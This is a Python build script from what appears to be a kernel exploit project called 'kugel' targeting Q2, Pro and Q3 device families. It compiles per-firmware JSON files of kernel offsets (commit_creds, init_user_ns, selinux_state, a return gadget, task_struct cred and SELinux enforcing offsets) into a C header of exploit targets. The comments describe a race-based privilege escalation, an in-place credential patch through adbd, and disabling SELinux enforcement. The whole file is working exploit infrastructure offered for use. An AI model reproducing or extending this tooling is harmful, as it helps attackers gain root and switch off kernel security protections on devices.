#!/usr/bin/env python3
# embed_targets.py -- compile targets/*.json into a C header for the kugel
# Q2/Pro/Q3 exploit.
#
#   python3 embed_targets.py [--out targets_gen.h]
#       Emits a plaintext kugel_target_t struct array.
#
# Struct fields (16 x u64 = 128 bytes per entry):
#   build_hash, commit_creds, root_user, init_user_ns, init_groups,
#   selinux_state, secblob, ret_gadget, ctx_refs_off, cap_full,
#   text_base, trace_wchan,
#   find_vpid, pid_task, ssuse, cred_layout
#
# find_vpid / pid_task / ssuse: text-relative offsets for the adbd
#   in-place cred-patch path.  0 => legacy SIGKILL / property path.
# cred_layout: packed u64 — low32 = cred_off (offsetof task_struct.cred),
#   high32 = enforcing_off (offsetof selinux_state.enforcing).
#   Both are struct layout constants, NOT kernel symbol offsets.
#
# text_base    = static _text link address for this build (KIMAGE_TEXT_BASE).
# trace_wchan  = OFF_TRACE_WCHAN if derived, else 0 (0 => 2 MB rounding).
#
# Per-family required fields:
#   Q2 / QPro : OFF_COMMIT_CREDS, OFF_SELINUX_STATE, OFF_RET
#   Q3 / 3S/3X: OFF_COMMIT_CREDS, OFF_SELINUX_STATE
#               (OFF_RET is static+inlined on 5.10 and never used by the
#               VBO race; OFF_SECBLOB may be null and disables --payload cred)
import argparse, glob, json, os, sys

def fnv1a64(s):
    h = 0xcbf29ce484222325
    for b in s.encode():
        h ^= b
        h = (h * 0x100000001b3) & 0xffffffffffffffff
    return h

def infer_family(name):
    low = name.lower()
    for prefix, fam in (("seacliff_", "q2"),  ("hollywood_", "q2"),
                        ("q2_",       "q2"),
                        ("qpro_",     "qpro"),
                        ("q3sx_",     "q3sx"),
                        ("q3s_",      "q3s"),
                        ("q3_",       "q3")):
        if low.startswith(prefix):
            return fam
    return None

def _u64_field(o, key):
    """Tolerant int() for a JSON offset that may be null, "0", or "0x...". """
    v = o.get(key)
    if v is None:
        return 0
    try:
        return int(v, 16)
    except (TypeError, ValueError):
        return 0

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--targets", default="targets")
    ap.add_argument("--out", default="targets_gen.h")
    a = ap.parse_args()

    entries = []
    skipped = []
    for path in sorted(glob.glob(os.path.join(a.targets, "*.json"))):
        name = os.path.splitext(os.path.basename(path))[0]
        try:
            j = json.load(open(path, encoding="utf-8"))
        except (OSError, ValueError) as e:
            skipped.append((name, "parse: %s" % e)); continue
        b = (j.get("device") or {}).get("build_incremental")
        k = j.get("kernel") or {}
        o = k.get("offsets") or {}
        if not b or not o:
            skipped.append((name, "missing build_incremental or offsets")); continue

        fam = infer_family(name)
        required = ["OFF_COMMIT_CREDS", "OFF_SELINUX_STATE"]
        if fam in (None, "q2", "qpro"):
            required.append("OFF_RET")
        missing_key = next((key for key in required if not o.get(key)), None)
        if missing_key:
            skipped.append((name, "missing %s" % missing_key)); continue

        ctx_s = k.get("ctx_refs_off")
        ctx = int(ctx_s, 16) if ctx_s else (0x148 if fam in ("q2", "qpro") else 0)
        cap_s = k.get("cap_full")
        if cap_s:
            cap = int(cap_s, 16)
        else:
            last = k.get("cap_last_cap") or 40
            cap = (1 << (last + 1)) - 1
        tb_s = k.get("text_base")
        tb = int(tb_s, 16) if tb_s else 0
        tw_s = o.get("OFF_TRACE_WCHAN")
        tw = int(tw_s, 16) if tw_s else 0
        # cred_layout packs two struct layout constants into one u64:
        #   low  32 bits = cred_off      (offsetof task_struct, cred)
        #   high 32 bits = enforcing_off (offsetof selinux_state, enforcing)
        # 0 in either half means "not derived" and forces the legacy path.
        cred_off_s = k.get("cred_off")
        cred_off_i = (int(cred_off_s, 16) if isinstance(cred_off_s, str)
                      else int(cred_off_s or 0))
        enf_off_i = int(k.get("enforcing_off") or 0)
        cred_layout = (cred_off_i & 0xffffffff) | ((enf_off_i & 0xffffffff) << 32)
        entries.append((b, fam, o, ctx, cap, tb, tw, cred_layout))

    if not entries:
        print("no usable targets under %s" % a.targets, file=sys.stderr)
        for n, why in skipped:
            print("  %s: %s" % (n, why), file=sys.stderr)
        sys.exit(1)
    if skipped:
        print("skipped %d target(s):" % len(skipped), file=sys.stderr)
        for n, why in skipped:
            print("  %s: %s" % (n, why), file=sys.stderr)

    n_count = len(entries)
    lines = [
        "// generated by embed_targets.py -- do not edit",
        "#ifndef TARGETS_GEN_H",
        "#define TARGETS_GEN_H",
        "#include <stdint.h>",
        "",
        "#define TARGETS_PLAINTEXT 1",
        "#define XT_COUNT %d" % n_count,
        "",
        "typedef struct {",
        "    uint64_t build_hash;",
        "    uint64_t commit_creds;",
        "    uint64_t root_user;",
        "    uint64_t init_user_ns;",
        "    uint64_t init_groups;",
        "    uint64_t selinux_state;",
        "    uint64_t secblob;",
        "    uint64_t ret_gadget;",
        "    uint64_t ctx_refs_off;",
        "    uint64_t cap_full;",
        "    uint64_t text_base;",
        "    uint64_t trace_wchan;",
        "    /* adbd in-place cred-patch fields; 0 => legacy SIGKILL path */",
        "    uint64_t find_vpid;   /* text-relative offset of find_vpid()            */",
        "    uint64_t pid_task;    /* text-relative offset of pid_task()             */",
        "    uint64_t ssuse;       /* text-relative offset of selinux_status_update_setenforce() */",
        "    uint64_t cred_layout; /* low32=cred_off, high32=enforcing_off (struct layout, not symbol) */",
        "} kugel_target_t;",
        "",
        "static const kugel_target_t KUGEL_TARGETS[XT_COUNT] = {",
    ]

    for b, fam, o, ctx, cap, tb, tw, cred_layout in entries:
        lines.append(
            "    { 0x%016xULL, 0x%xULL, 0x%xULL, 0x%xULL, 0x%xULL, "
            "0x%xULL, 0x%xULL, 0x%xULL, 0x%xULL, 0x%xULL, "
            "0x%xULL, 0x%xULL, 0x%xULL, 0x%xULL, 0x%xULL, "
            "0x%016xULL }, /* %s */" % (
                fnv1a64(b),
                _u64_field(o, "OFF_COMMIT_CREDS"),
                _u64_field(o, "OFF_ROOT_USER"),
                _u64_field(o, "OFF_INIT_USER_NS"),
                _u64_field(o, "OFF_INIT_GROUPS"),
                _u64_field(o, "OFF_SELINUX_STATE"),
                _u64_field(o, "OFF_SECBLOB"),
                _u64_field(o, "OFF_RET"),
                ctx,
                cap,
                tb,
                tw,
                _u64_field(o, "OFF_FIND_VPID"),
                _u64_field(o, "OFF_PID_TASK"),
                _u64_field(o, "OFF_SSUSE"),
                cred_layout,
                fam or "?",
            ))

    lines += ["};", "", "#endif"]
    open(a.out, "w", encoding="utf-8").write("\n".join(lines) + "\n")
    print("wrote %s: %d targets" % (a.out, n_count))

if __name__ == "__main__":
    main()
